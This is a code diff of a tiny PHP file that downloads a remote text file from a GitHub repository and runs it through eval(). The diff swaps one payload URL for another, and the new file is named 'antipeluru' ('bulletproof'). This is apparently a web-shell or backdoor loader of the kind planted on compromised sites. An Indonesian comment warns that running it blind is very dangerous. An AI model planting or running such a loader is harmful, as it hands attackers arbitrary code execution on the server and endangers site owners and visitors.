@@ -1,4 +1,4 @@
 <?php
-$code = file_get_contents("https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/main/repository-matitanam.php.txt");
+$code = file_get_contents("https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/antipeluru.php.txt");
 eval('?>' . $code); // HATI-HATI: Sangat berbahaya jika tidak tahu isi file-nya!
 ?>
